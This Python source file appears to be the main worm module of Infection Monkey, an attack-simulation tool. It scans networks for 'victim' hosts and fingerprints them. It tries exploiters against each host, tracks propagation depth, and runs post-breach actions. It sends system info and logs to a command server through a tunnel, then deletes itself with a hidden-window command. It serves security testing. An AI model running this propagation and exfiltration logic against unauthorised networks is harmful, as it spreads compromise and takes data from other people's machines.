import argparse
import logging
import os
import subprocess
import sys
import time
from threading import Thread

import infection_monkey.tunnel as tunnel
from common.network.network_utils import get_host_from_network_location
from common.utils.attack_utils import ScanStatus, UsageEnum
from common.utils.exceptions import (ExploitingVulnerableMachineError,
                                     FailedExploitationError)
from common.version import get_version
from infection_monkey.config import WormConfiguration
from infection_monkey.control import ControlClient
from infection_monkey.exploit.HostExploiter import HostExploiter
from infection_monkey.model import DELAY_DELETE_CMD
from infection_monkey.network.firewall import app as firewall
from infection_monkey.network.HostFinger import HostFinger
from infection_monkey.network.network_scanner import NetworkScanner
from infection_monkey.network.tools import (get_interface_to_target,
                                            is_running_on_server)
from infection_monkey.post_breach.post_breach_handler import PostBreach
from infection_monkey.system_info import SystemInfoCollector
from infection_monkey.system_singleton import SystemSingleton
from infection_monkey.telemetry.attack.t1106_telem import T1106Telem
from infection_monkey.telemetry.attack.t1107_telem import T1107Telem
from infection_monkey.telemetry.attack.victim_host_telem import VictimHostTelem
from infection_monkey.telemetry.scan_telem import ScanTelem
from infection_monkey.telemetry.state_telem import StateTelem
from infection_monkey.telemetry.system_info_telem import SystemInfoTelem
from infection_monkey.telemetry.trace_telem import TraceTelem
from infection_monkey.telemetry.tunnel_telem import TunnelTelem
from infection_monkey.utils.environment import is_windows_os
from infection_monkey.utils.exceptions.planned_shutdown_exception import \
    PlannedShutdownException
from infection_monkey.utils.monkey_dir import (create_monkey_dir,
                                               get_monkey_dir_path,
                                               remove_monkey_dir)
from infection_monkey.utils.monkey_log_path import get_monkey_log_path
from infection_monkey.windows_upgrader import WindowsUpgrader

MAX_DEPTH_REACHED_MESSAGE = "Reached max depth, shutting down"

__author__ = 'itamar'

LOG = logging.getLogger(__name__)


class InfectionMonkey(object):
    def __init__(self, args):
        self._keep_running = False
        self._exploited_machines = set()
        self._fail_exploitation_machines = set()
        self._singleton = SystemSingleton()
        self._parent = None
        self._default_tunnel = None
        self._args = args
        self._network = None
        self._dropper_path = None
        self._exploiters = None
        self._fingerprint = None
        self._default_server = None
        self._default_server_port = None
        self._depth = 0
        self._opts = None
        self._upgrading_to_64 = False

    def initialize(self):
        LOG.info("Monkey is initializing...")

        if not self._singleton.try_lock():
            raise Exception("Another instance of the monkey is already running")

        arg_parser = argparse.ArgumentParser()
        arg_parser.add_argument('-p', '--parent')
        arg_parser.add_argument('-t', '--tunnel')
        arg_parser.add_argument('-s', '--server')
        arg_parser.add_argument('-d', '--depth', type=int)
        arg_parser.add_argument('-vp', '--vulnerable-port')
        self._opts, self._args = arg_parser.parse_known_args(self._args)
        self.log_arguments()

        self._parent = self._opts.parent
        self._default_tunnel = self._opts.tunnel
        self._default_server = self._opts.server

        if self._opts.depth is not None:
            WormConfiguration._depth_from_commandline = True
            WormConfiguration.depth = self._opts.depth
            LOG.debug("Setting propagation depth from command line")
        LOG.debug(f"Set propagation depth to {WormConfiguration.depth}")

        self._keep_running = True
        self._network = NetworkScanner()
        self._dropper_path = sys.argv[0]

        if self._default_server:
            if self._default_server not in WormConfiguration.command_servers:
                LOG.debug("Added default server: %s" % self._default_server)
                WormConfiguration.command_servers.insert(0, self._default_server)
            else:
                LOG.debug("Default server: %s is already in command servers list" % self._default_server)

    def start(self):
        try:
            LOG.info("Monkey is starting...")

            LOG.debug("Starting the setup phase.")
            # Sets island's IP and port for monkey to communicate to
            self.set_default_server()
            self.set_default_port()

            # Create a dir for monkey files if there isn't one
            create_monkey_dir()

            self.upgrade_to_64_if_needed()

            ControlClient.wakeup(parent=self._parent)
            ControlClient.load_control_config()

            if is_windows_os():
                T1106Telem(ScanStatus.USED, UsageEnum.SINGLETON_WINAPI).send()

            self.shutdown_by_not_alive_config()

            if self.is_started_on_island():
                ControlClient.report_start_on_island()
            ControlClient.should_monkey_run(self._opts.vulnerable_port)

            if firewall.is_enabled():
                firewall.add_firewall_rule()

            monkey_tunnel = ControlClient.create_control_tunnel()
            if monkey_tunnel:
                monkey_tunnel.start()

            StateTelem(is_done=False, version=get_version()).send()
            TunnelTelem().send()

            LOG.debug("Starting the post-breach phase asynchronously.")
            post_breach_phase = Thread(target=self.start_post_breach_phase)
            post_breach_phase.start()

            LOG.debug("Starting the propagation phase.")
            self.shutdown_by_max_depth_reached()

            for iteration_index in range(WormConfiguration.max_iterations):
                ControlClient.keepalive()
                ControlClient.load_control_config()

                self._network.initialize()

                self._fingerprint = HostFinger.get_instances()

                self._exploiters = HostExploiter.get_classes()

                if not self._keep_running or not WormConfiguration.alive:
                    break

                machines = self._network.get_victim_machines(max_find=WormConfiguration.victims_max_find,
                                                             stop_callback=ControlClient.check_for_stop)
                is_empty = True
                for machine in machines:
                    if ControlClient.check_for_stop():
                        break

                    is_empty = False
                    for finger in self._fingerprint:
                        LOG.info("Trying to get OS fingerprint from %r with module %s",
                                 machine, finger.__class__.__name__)
                        finger.get_host_fingerprint(machine)

                    ScanTelem(machine).send()

                    # skip machines that we've already exploited
                    if machine in self._exploited_machines:
                        LOG.debug("Skipping %r - already exploited",
                                  machine)
                        continue
                    elif machine in self._fail_exploitation_machines:
                        if WormConfiguration.retry_failed_explotation:
                            LOG.debug("%r - exploitation failed before, trying again", machine)
                        else:
                            LOG.debug("Skipping %r - exploitation failed before", machine)
                            continue

                    if monkey_tunnel:
                        monkey_tunnel.set_tunnel_for_host(machine)
                    if self._default_server:
                        if self._network.on_island(self._default_server):
                            machine.set_default_server(get_interface_to_target(machine.ip_addr) +
                                                       (
                                                           ':' + self._default_server_port if self._default_server_port else ''))
                        else:
                            machine.set_default_server(self._default_server)
                        LOG.debug("Default server for machine: %r set to %s" % (machine, machine.default_server))

                    # Order exploits according to their type
                    self._exploiters = sorted(self._exploiters, key=lambda exploiter_: exploiter_.EXPLOIT_TYPE.value)
                    host_exploited = False
                    for exploiter in [exploiter(machine) for exploiter in self._exploiters]:
                        if self.try_exploiting(machine, exploiter):
                            host_exploited = True
                            VictimHostTelem('T1210', ScanStatus.USED, machine=machine).send()
                            break
                    if not host_exploited:
                        self._fail_exploitation_machines.add(machine)
                        VictimHostTelem('T1210', ScanStatus.SCANNED, machine=machine).send()
                    if not self._keep_running:
                        break

                if (not is_empty) and (WormConfiguration.max_iterations > iteration_index + 1):
                    time_to_sleep = WormConfiguration.timeout_between_iterations
                    LOG.info("Sleeping %d seconds before next life cycle iteration", time_to_sleep)
                    time.sleep(time_to_sleep)

            if self._keep_running and WormConfiguration.alive:
                LOG.info("Reached max iterations (%d)", WormConfiguration.max_iterations)
            elif not WormConfiguration.alive:
                LOG.info("Marked not alive from configuration")

            # if host was exploited, before continue to closing the tunnel ensure the exploited host had its chance to
            # connect to the tunnel
            if len(self._exploited_machines) > 0:
                time_to_sleep = WormConfiguration.keep_tunnel_open_time
                LOG.info("Sleeping %d seconds for exploited machines to connect to tunnel", time_to_sleep)
                time.sleep(time_to_sleep)

            if monkey_tunnel:
                monkey_tunnel.stop()
                monkey_tunnel.join()

            post_breach_phase.join()

        except PlannedShutdownException:
            LOG.info("A planned shutdown of the Monkey occurred. Logging the reason and finishing execution.")
            LOG.exception("Planned shutdown, reason:")

    def start_post_breach_phase(self):
        self.collect_system_info_if_configured()
        PostBreach().execute_all_configured()

    def shutdown_by_max_depth_reached(self):
        if 0 == WormConfiguration.depth:
            TraceTelem(MAX_DEPTH_REACHED_MESSAGE).send()
            raise PlannedShutdownException(MAX_DEPTH_REACHED_MESSAGE)
        else:
            LOG.debug("Running with depth: %d" % WormConfiguration.depth)

    def collect_system_info_if_configured(self):
        LOG.debug("Calling system info collection")
        system_info_collector = SystemInfoCollector()
        system_info = system_info_collector.get_info()
        SystemInfoTelem(system_info).send()

    def shutdown_by_not_alive_config(self):
        if not WormConfiguration.alive:
            raise PlannedShutdownException("Marked 'not alive' from configuration.")

    def upgrade_to_64_if_needed(self):
        if WindowsUpgrader.should_upgrade():
            self._upgrading_to_64 = True
            self._singleton.unlock()
            LOG.info("32bit monkey running on 64bit Windows. Upgrading.")
            WindowsUpgrader.upgrade(self._opts)
            raise PlannedShutdownException("Finished upgrading from 32bit to 64bit.")

    def cleanup(self):
        LOG.info("Monkey cleanup started")
        self._keep_running = False

        if self._upgrading_to_64:
            InfectionMonkey.close_tunnel()
            firewall.close()
        else:
            StateTelem(is_done=True, version=get_version()).send()  # Signal the server (before closing the tunnel)
            InfectionMonkey.close_tunnel()
            firewall.close()
            if WormConfiguration.send_log_to_server:
                self.send_log()
            self._singleton.unlock()

        InfectionMonkey.self_delete()
        LOG.info("Monkey is shutting down")

    @staticmethod
    def close_tunnel():
        tunnel_address = ControlClient.proxies.get('https', '').replace('https://', '').split(':')[0]
        if tunnel_address:
            LOG.info("Quitting tunnel %s", tunnel_address)
            tunnel.quit_tunnel(tunnel_address)

    @staticmethod
    def self_delete():
        status = ScanStatus.USED if remove_monkey_dir() else ScanStatus.SCANNED
        T1107Telem(status, get_monkey_dir_path()).send()

        if WormConfiguration.self_delete_in_cleanup \
                and -1 == sys.executable.find('python'):
            try:
                status = None
                if "win32" == sys.platform:
                    from subprocess import (CREATE_NEW_CONSOLE,
                                            STARTF_USESHOWWINDOW, SW_HIDE)
                    startupinfo = subprocess.STARTUPINFO()
                    startupinfo.dwFlags = CREATE_NEW_CONSOLE | STARTF_USESHOWWINDOW
                    startupinfo.wShowWindow = SW_HIDE
                    subprocess.Popen(DELAY_DELETE_CMD % {'file_path': sys.executable},
                                     stdin=None, stdout=None, stderr=None,
                                     close_fds=True, startupinfo=startupinfo)
                else:
                    os.remove(sys.executable)
                    status = ScanStatus.USED
            except Exception as exc:
                LOG.error("Exception in self delete: %s", exc)
                status = ScanStatus.SCANNED
            if status:
                T1107Telem(status, sys.executable).send()

    def send_log(self):
        monkey_log_path = get_monkey_log_path()
        if os.path.exists(monkey_log_path):
            with open(monkey_log_path, 'r') as f:
                log = f.read()
        else:
            log = ''

        ControlClient.send_log(log)

    def try_exploiting(self, machine, exploiter):
        """
        Workflow of exploiting one machine with one exploiter
        :param machine: Machine monkey tries to exploit
        :param exploiter: Exploiter to use on that machine
        :return: True if successfully exploited, False otherwise
        """
        if not exploiter.is_os_supported():
            LOG.info("Skipping exploiter %s host:%r, os %s is not supported",
                     exploiter.__class__.__name__, machine, machine.os)
            return False

        LOG.info("Trying to exploit %r with exploiter %s...", machine, exploiter.__class__.__name__)

        result = False
        try:
            result = exploiter.exploit_host()
            if result:
                self.successfully_exploited(machine, exploiter)
                return True
            else:
                LOG.info("Failed exploiting %r with exploiter %s", machine, exploiter.__class__.__name__)
        except ExploitingVulnerableMachineError as exc:
            LOG.error("Exception while attacking %s using %s: %s",
                      machine, exploiter.__class__.__name__, exc)
            self.successfully_exploited(machine, exploiter)
            return True
        except FailedExploitationError as e:
            LOG.info("Failed exploiting %r with exploiter %s, %s", machine, exploiter.__class__.__name__, e)
        except Exception as exc:
            LOG.exception("Exception while attacking %s using %s: %s",
                          machine, exploiter.__class__.__name__, exc)
        finally:
            exploiter.send_exploit_telemetry(result)
        return False

    def successfully_exploited(self, machine, exploiter):
        """
        Workflow of registering successfully exploited machine
        :param machine: machine that was exploited
        :param exploiter: exploiter that succeeded
        """
        self._exploited_machines.add(machine)

        LOG.info("Successfully propagated to %s using %s",
                 machine, exploiter.__class__.__name__)

        # check if max-exploitation limit is reached
        if WormConfiguration.victims_max_exploit <= len(self._exploited_machines):
            self._keep_running = False

            LOG.info("Max exploited victims reached (%d)", WormConfiguration.victims_max_exploit)

    def set_default_port(self):
        try:
            self._default_server_port = self._default_server.split(':')[1]
        except KeyError:
            self._default_server_port = ''

    def set_default_server(self):
        """
        Sets the default server for the Monkey to communicate back to.
        :raises PlannedShutdownException if couldn't find the server.
        """
        if not ControlClient.find_server(default_tunnel=self._default_tunnel):
            raise PlannedShutdownException(
                "Monkey couldn't find server with {} default tunnel.".format(self._default_tunnel))
        self._default_server = WormConfiguration.current_server
        LOG.debug("default server set to: %s" % self._default_server)

    def is_started_on_island(self):
        island_ip = get_host_from_network_location(self._default_server)
        return is_running_on_server(island_ip) and WormConfiguration.depth == WormConfiguration.max_depth

    def log_arguments(self):
        arg_string = " ".join([f"{key}: {value}" for key, value in vars(self._opts).items()])
        LOG.info(f"Monkey started with arguments: {arg_string}")
